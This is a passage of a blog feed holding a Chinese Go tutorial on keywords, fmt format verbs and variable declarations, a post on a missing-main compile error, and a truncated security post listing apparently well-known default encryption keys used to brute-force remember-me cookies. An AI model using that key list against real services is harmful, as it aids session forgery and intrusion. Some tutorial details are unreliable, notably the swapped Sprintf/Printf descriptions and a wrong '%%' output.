class="headerlink" title="行分隔符"></a>行分隔符</h3><p>每一行代表一个语句结束，不需要分号结尾</p><p>如果将多个语句写入一行，每个语句就需要以分号分隔</p><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><p>用来命名变量、类型等程序实体</p><p>标识符规定：大小写字母、数字和下划线组成，必须以字母或者下划线开头，不能以数字开头Go语言关键字</p><h3 id="字符串连接符"><a href="#字符串连接符" class="headerlink" title="字符串连接符"></a>字符串连接符</h3><p>通过 + 进行字符串的连接</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function">func <span class="hljs-title">init</span>()</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;this is init func&quot;</span> + <span class="hljs-string">&quot; &quot;</span> + <span class="hljs-string">&quot;字符串连接符测试&quot;</span>)<br>&#125;<br><br>➜  gocode go run hello.go<br><span class="hljs-keyword">this</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">init</span> func 字符串连接符测试<br></code></pre></td></tr></table></figure><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><h4 id="25个关键字或保留字"><a href="#25个关键字或保留字" class="headerlink" title="25个关键字或保留字"></a>25个关键字或保留字</h4><h5 id="break"><a href="#break" class="headerlink" title="break"></a><strong>break</strong></h5><p>用于跳出循环，常和 for 循环或 switch 语句使用</p><h5 id="default"><a href="#default" class="headerlink" title="default"></a><strong>default</strong></h5><p>循环默认选项，用在switch和select语句中</p><h5 id="func"><a href="#func" class="headerlink" title="func"></a><strong>func</strong></h5><p>函数定义</p><h5 id="interface"><a href="#interface" class="headerlink" title="interface"></a>interface</h5><p>定义接口</p><h5 id="select"><a href="#select" class="headerlink" title="select"></a>select</h5><p>通道控制结构，类似 switch，作用对象为通道操作（发送或接收）</p><h5 id="case"><a href="#case" class="headerlink" title="case"></a>case</h5><p>用在switch语句之中，表示其中的一个分支</p><h5 id="defer"><a href="#defer" class="headerlink" title="defer"></a>defer</h5><p>延迟执行，函数的收尾工作，在函数结束前执行</p><h5 id="go"><a href="#go" class="headerlink" title="go"></a>go</h5><p>并发</p><h5 id="map"><a href="#map" class="headerlink" title="map"></a>map</h5><p>map结构类型</p><h5 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h5><p>定义结构体</p><h5 id="chan"><a href="#chan" class="headerlink" title="chan"></a>chan</h5><p>定义 channel</p><h5 id="else"><a href="#else" class="headerlink" title="else"></a>else</h5><p>用在条件语句中，表明当条件不成立时的分支</p><h5 id="goto"><a href="#goto" class="headerlink" title="goto"></a>goto</h5><p>跳转语句</p><h5 id="package"><a href="#package" class="headerlink" title="package"></a>package</h5><p>包</p><h5 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h5><p>分支语句结构的引导词</p><h5 id="const"><a href="#const" class="headerlink" title="const"></a>const</h5><p>声明常量</p><h5 id="fallthrough"><a href="#fallthrough" class="headerlink" title="fallthrough"></a>fallthrough</h5><p>如果case带有fallthrough，程序会继续执行下一条case,不会再判断下一条case的值</p><h5 id="if"><a href="#if" class="headerlink" title="if"></a>if</h5><p>条件语句的判断</p><h5 id="range"><a href="#range" class="headerlink" title="range"></a>range</h5><p>从slice、map等结构中取元素</p><h5 id="type"><a href="#type" class="headerlink" title="type"></a>type</h5><p>定义类型</p><h5 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h5><p>回到一次循环的开始处</p><h5 id="for"><a href="#for" class="headerlink" title="for"></a>for</h5><p>for 循环</p><p>import</p><p>引入指定的包或类</p><h5 id="return"><a href="#return" class="headerlink" title="return"></a>return</h5><p>从方法中返回</p><h5 id="var"><a href="#var" class="headerlink" title="var"></a>var</h5><p>声明变量</p><h4 id="36-个预定义标识"><a href="#36-个预定义标识" class="headerlink" title="36 个预定义标识"></a>36 个预定义标识</h4><table><thead><tr><th align="left">append</th><th align="left">bool</th><th align="left">byte</th><th align="left">cap</th><th align="left">close</th><th align="left">complex</th><th align="left">complex64</th><th align="left">complex128</th><th align="left">uint16</th></tr></thead><tbody><tr><td align="left">copy</td><td align="left">false</td><td align="left">float32</td><td align="left">float64</td><td align="left">imag</td><td align="left">int</td><td align="left">int8</td><td align="left">int16</td><td align="left">uint32</td></tr><tr><td align="left">int32</td><td align="left">int64</td><td align="left">iota</td><td align="left">len</td><td align="left">make</td><td align="left">new</td><td align="left">nil</td><td align="left">panic</td><td align="left">uint64</td></tr><tr><td align="left">print</td><td align="left">println</td><td align="left">real</td><td align="left">recover</td><td align="left">string</td><td align="left">true</td><td align="left">uint</td><td align="left">uint8</td><td align="left">uintptr</td></tr></tbody></table><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><h4 id="fmt-Sprintf"><a href="#fmt-Sprintf" class="headerlink" title="fmt.Sprintf"></a>fmt.Sprintf</h4><h5 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h5><p>fmt.Sprintf(格式化样式, 参数列表…)</p><p>格式化样式：字符串形式，格式化符号以 % 开头， %s 字符串格式，%d 十进制的整数格式</p><p>参数列表：多个参数以逗号分隔，个数必须与格式化样式中的个数一一对应，否则运行时会报错。</p><p>根据格式化参数生成格式化的字符串并写入标准输出</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> inttype = <span class="hljs-number">123</span><br><span class="hljs-keyword">var</span> stringtype = <span class="hljs-string">&quot;test&quot;</span><br><span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%d&amp;str=%s&quot;</span><br><span class="hljs-keyword">var</span> spliceresult = fmt.Sprintf(splice, inttype, stringtype)<br>fmt.Println(spliceresult)<br>&#125;<br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br><span class="hljs-type">int</span>=<span class="hljs-number">123</span>&amp;str=test<br></code></pre></td></tr></table></figure><h4 id="fmt-Printf"><a href="#fmt-Printf" class="headerlink" title="fmt.Printf"></a>fmt.Printf</h4><p>根据格式化参数生成格式化的字符串并返回该字符串</p><h5 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h5><p>fmt.Printf(格式化样式, 参数列表…)</p><p>格式化样式：字符串形式，格式化符号以 % 开头， %s 字符串格式，%d 十进制的整数格式。<br>参数列表：多个参数以逗号分隔，个数必须与格式化样式中的个数一一对应，否则运行时会报错。</p><h4 id="字符串格式化符号"><a href="#字符串格式化符号" class="headerlink" title="字符串格式化符号"></a>字符串格式化符号</h4><h5 id="v"><a href="#v" class="headerlink" title="%v"></a>%v</h5><p>按照值的本来值输出</p><h5 id="v-1"><a href="#v-1" class="headerlink" title="%+v"></a>%+v</h5><p>在 %v 基础上，对结构体字段名和值进行展开</p><h5 id="v-2"><a href="#v-2" class="headerlink" title="%#v"></a>%#v</h5><p>输出 Go 语言语法格式的值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> inttype = <span class="hljs-number">123</span><br><span class="hljs-keyword">var</span> stringtype = <span class="hljs-string">&quot;test&quot;</span><br><span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%b&amp;str=%#v&quot;</span><br>result := fmt.Sprintf(splice, inttype, stringtype)<br>io.WriteString(os.Stdout, result)<br>&#125;<br><br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br><span class="hljs-type">int</span>=<span class="hljs-number">1111011</span>&amp;str=<span class="hljs-string">&quot;test&quot;</span>% <br></code></pre></td></tr></table></figure><h5 id="T"><a href="#T" class="headerlink" title="%T"></a>%T</h5><p>输出 Go 语言语法格式的类型和值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> stringtype = <span class="hljs-string">&quot;test&quot;</span><br><span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;str=%T&quot;</span><br>result := fmt.Sprintf(splice, stringtype)<br>io.WriteString(os.Stdout, result)<br>&#125;<br><br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br>str=<span class="hljs-type">string</span>%     <br></code></pre></td></tr></table></figure><h5 id=""><a href="#" class="headerlink" title="%%"></a>%%</h5><p>输出 %</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;str=%%&quot;</span><br>result := fmt.Sprintf(splice)<br>io.WriteString(os.Stdout, result)<br>&#125;<br><br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br>str=%%    <br></code></pre></td></tr></table></figure><h5 id="b"><a href="#b" class="headerlink" title="%b"></a>%b</h5><p>整型以二进制方式显示</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> <span class="hljs-keyword">var</span> inttype = <span class="hljs-number">66</span><br> <span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%b&quot;</span><br> result := fmt.Sprintf(splice, inttype)<br> io.WriteString(os.Stdout, result)<br>&#125;<br><br><br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br><span class="hljs-type">int</span>=<span class="hljs-number">1000010</span>%   <br></code></pre></td></tr></table></figure><h5 id="o"><a href="#o" class="headerlink" title="%o"></a>%o</h5><p>整型以八进制方式显示</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> <span class="hljs-keyword">var</span> inttype = <span class="hljs-number">66</span><br> <span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%o&quot;</span><br> result := fmt.Sprintf(splice, inttype)<br> io.WriteString(os.Stdout, result)<br>&#125;<br><br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br><span class="hljs-type">int</span>=<span class="hljs-number">102</span>%   <br></code></pre></td></tr></table></figure><h5 id="d"><a href="#d" class="headerlink" title="%d"></a>%d</h5><p>整型以十进制方式显示</p><h5 id="x"><a href="#x" class="headerlink" title="%x"></a>%x</h5><p>整型以十六进制方式显示</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> <span class="hljs-keyword">var</span> inttype = <span class="hljs-number">66</span><br> <span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%x&quot;</span><br> result := fmt.Sprintf(splice, inttype)<br> io.WriteString(os.Stdout, result)<br>&#125;<br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span> <br><span class="hljs-type">int</span>=<span class="hljs-number">42</span>% <br></code></pre></td></tr></table></figure><h5 id="X"><a href="#X" class="headerlink" title="%X"></a>%X</h5><p>整型以十六进制方式显示，显示中的字母为大写</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> <span class="hljs-keyword">var</span> inttype = <span class="hljs-number">666666</span><br> <span class="hljs-comment">// var strtype = &quot;123kkkkk&quot;</span><br> <span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%x&quot;</span><br> result := fmt.Sprintf(splice, inttype)<br> io.WriteString(os.Stdout, result)<br>&#125;<br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br><span class="hljs-type">int</span>=a2c2a%  <br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> <span class="hljs-keyword">var</span> inttype = <span class="hljs-number">666666</span><br> <span class="hljs-comment">// var strtype = &quot;123kkkkk&quot;</span><br> <span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%X&quot;</span><br> result := fmt.Sprintf(splice, inttype)<br> io.WriteString(os.Stdout, result)<br>&#125;<br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br><span class="hljs-type">int</span>=A2C2A%  <br></code></pre></td></tr></table></figure><h5 id="U"><a href="#U" class="headerlink" title="%U"></a>%U</h5><p>Unicode字符</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> <span class="hljs-keyword">var</span> inttype = <span class="hljs-number">666666</span><br> <span class="hljs-comment">// var strtype = &quot;123kkkkk&quot;</span><br> <span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%U&quot;</span><br> result := fmt.Sprintf(splice, inttype)<br> io.WriteString(os.Stdout, result)<br>&#125;<br><br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br><span class="hljs-type">int</span>=U+A2C2A%   <br></code></pre></td></tr></table></figure><h5 id="f"><a href="#f" class="headerlink" title="%f"></a>%f</h5><p>浮点数</p><p>%.2f，小数点后两位精度</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> <span class="hljs-keyword">var</span> inttype = <span class="hljs-number">6.66666</span><br> <span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%f&quot;</span><br> <span class="hljs-keyword">var</span> splice1 = <span class="hljs-string">&quot;\nint=%.2f&quot;</span><br> result := fmt.Sprintf(splice, inttype)<br> io.WriteString(os.Stdout, result)<br> result1 := fmt.Sprintf(splice1, inttype)<br> io.WriteString(os.Stdout, result1)<br>&#125;<br><br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br><span class="hljs-type">int</span>=<span class="hljs-number">6.666660</span><br><span class="hljs-type">int</span>=<span class="hljs-number">6.67</span>%   <br></code></pre></td></tr></table></figure><h5 id="p"><a href="#p" class="headerlink" title="%p"></a>%p</h5><p>指针，十六进制显示</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>数据类型用于声明函数和变量，不同的数据类型代表不同大小内存大小</p><h3 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h3><p>值必须是常量 true 或者 false</p><p>var booltest bool &#x3D; tru</p><h3 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h3><p>整型 int</p><p>浮点型 float32 float64</p><h3 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h3><p>单个字符连接而成，UTF-8 编码标识 Unicode 文本</p><h3 id="派生类型"><a href="#派生类型" class="headerlink" title="派生类型"></a>派生类型</h3><h4 id="指针类型-Pointer"><a href="#指针类型-Pointer" class="headerlink" title="指针类型 Pointer"></a>指针类型 Pointer</h4><h4 id="数组类型"><a href="#数组类型" class="headerlink" title="数组类型"></a>数组类型</h4><h4 id="结构化类型-struct"><a href="#结构化类型-struct" class="headerlink" title="结构化类型 struct"></a>结构化类型 struct</h4><h4 id="Channel类型"><a href="#Channel类型" class="headerlink" title="Channel类型"></a>Channel类型</h4><h4 id="函数类型"><a href="#函数类型" class="headerlink" title="函数类型"></a>函数类型</h4><h4 id="切片类型"><a href="#切片类型" class="headerlink" title="切片类型"></a>切片类型</h4><h4 id="接口类型-interface"><a href="#接口类型-interface" class="headerlink" title="接口类型 interface"></a>接口类型 interface</h4><h4 id="Map类型"><a href="#Map类型" class="headerlink" title="Map类型"></a>Map类型</h4><h2 id="变量-1"><a href="#变量-1" class="headerlink" title="变量"></a>变量</h2><h3 id="组成结构"><a href="#组成结构" class="headerlink" title="组成结构"></a>组成结构</h3><p>由数字、字母和下划线组成，首个字符不可以是数字</p><h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><h4 id="声明单个变量"><a href="#声明单个变量" class="headerlink" title="声明单个变量"></a>声明单个变量</h4><p>var identifier type</p><h4 id="声明多个变量"><a href="#声明多个变量" class="headerlink" title="声明多个变量"></a>声明多个变量</h4><p>var indentifier, indentifier type</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> strtest <span class="hljs-type">string</span> = <span class="hljs-string">&quot;strtest&quot;</span><br><span class="hljs-keyword">var</span> inttest1, inttest2 <span class="hljs-type">int</span> = <span class="hljs-number">1</span>, <span class="hljs-number">2</span><br>fmt.Print(strtest + <span class="hljs-string">&quot;\n&quot;</span>)<br>fmt.Print(inttest1, inttest2)<br>&#125;<br><br>➜  gocode <span class="hljs-keyword">go</span> run identifiertest.<span class="hljs-keyword">go</span><br>strtest<br><span class="hljs-number">1</span> <span class="hljs-number">2</span>% <br></code></pre></td></tr></table></figure><h4 id="变量声明描述"><a href="#变量声明描述" class="headerlink" title="变量声明描述"></a>变量声明描述</h4><p>1、指定变量类型，如果没有初始化，则变量默认为零值</p><p>int 类型默认为 0</p><p>bool 类型默认为 false</p><p>字符类型默认为 “”(空字符串)</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> vartest <span class="hljs-type">int</span><br>fmt.Println(vartest)<br><span class="hljs-keyword">var</span> booltest <span class="hljs-type">bool</span><br>fmt.Println(booltest)<br>&#125;<br><br>➜  gocode <span class="hljs-keyword">go</span> run identifiertest.<span class="hljs-keyword">go</span><br><span class="hljs-number">0</span><br><span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>2、根据值自动判定变量类型</p><p>var key &#x3D; value</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> vartest = <span class="hljs-number">1</span><br>fmt.Println(vartest)<br><span class="hljs-keyword">var</span> booltest = <span class="hljs-literal">true</span><br>fmt.Println(booltest)<br>&#125;<br><br>➜  gocode <span class="hljs-keyword">go</span> run identifiertest.<span class="hljs-keyword">go</span><br><span class="hljs-number">1</span><br><span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>3、直接声明并赋值 :&#x3D;</p><p>name :&#x3D; value</p><p>intVal :&#x3D; 111 </p><p>等价于</p><p>var intVal int</p><p>intVal &#x3D; 111</p><p>注意</p><p>如果已经声明过变量，再使用 :&#x3D; 会产生编译错误</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> vartest<br>vartest := <span class="hljs-number">1</span><br>fmt.Println(vartest)<br>&#125;<br><br>➜  gocode <span class="hljs-keyword">go</span> run identifiertest.<span class="hljs-keyword">go</span><br># command-line-arguments<br>./identifiertest.<span class="hljs-keyword">go</span>:<span class="hljs-number">8</span>:<span class="hljs-number">13</span>: syntax <span class="hljs-type">error</span>: unexpected newline, expected <span class="hljs-keyword">type</span><br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>vartest := <span class="hljs-number">1</span><br>fmt.Println(vartest)<br>&#125;<br><br>➜  gocode <span class="hljs-keyword">go</span> run identifiertest.<span class="hljs-keyword">go</span><br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>dev</category>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dev</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>golang_error</title>
    <link href="/2024/03/14/dev/golang/golang_error/"/>
    <url>/2024/03/14/dev/golang/golang_error/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="runtime-main-main·f-function-main-is-undeclared-in-the-main-package"><a href="#runtime-main-main·f-function-main-is-undeclared-in-the-main-package" class="headerlink" title="runtime.main_main·f: function main is undeclared in the main package"></a>runtime.main_main·f: function main is undeclared in the main package</h2><h3 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a>报错信息</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ada">➜  gocode go run printgo.go<br># command-line-arguments<br>runtime.main_main·f: <span class="hljs-keyword">function</span> <span class="hljs-title">main</span> <span class="hljs-keyword">is</span> undeclared <span class="hljs-keyword">in</span> the main <span class="hljs-keyword">package</span><br><span class="hljs-title"><span class="hljs-keyword">package</span> main</span><br><br>import <span class="hljs-string">&quot;fmt&quot;</span><br><br>func printtest() &#123;<br>fmt.Println(<span class="hljs-string">&quot;test&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="报错原因"><a href="#报错原因" class="headerlink" title="报错原因"></a>报错原因</h3><p>Go程序中找不到主函数（main函数）的定义或声明。在Go中，每个可执行程序都必须包含一个名为<code>main</code>的包，并在该包中包含一个名为<code>main</code>的函数。这个<code>main</code>函数是程序的入口点，它会被自动调用。</p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>增加main函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">printtest</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;test&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>printtest()<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>dev</category>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dev</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sorl_keys</title>
    <link href="/2024/03/14/security/secvulns/solr/solr_keys/"/>
    <url>/2024/03/14/security/secvulns/solr/solr_keys/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27;kPH+bIxk5D2deZiIxcaaaA==&#x27;, &#x27;4AvVhmFLUs0KTA3Kprsdag==&#x27;, &#x27;fCq+/xW488hMTCE+cmJ3FF==&#x27;, &#x27;zSyK5Kp6PZAAjlT+eeNMlg==&#x27;, &#x27;WkhBTkdYSUFPSEVJX0NBVA==&#x27;,<br>&#x27;RVZBTk5JR0hUTFlfV0FPVQ==&#x27;, &#x27;U3ByaW5nQmxhZGUAAAAAAA==&#x27;, 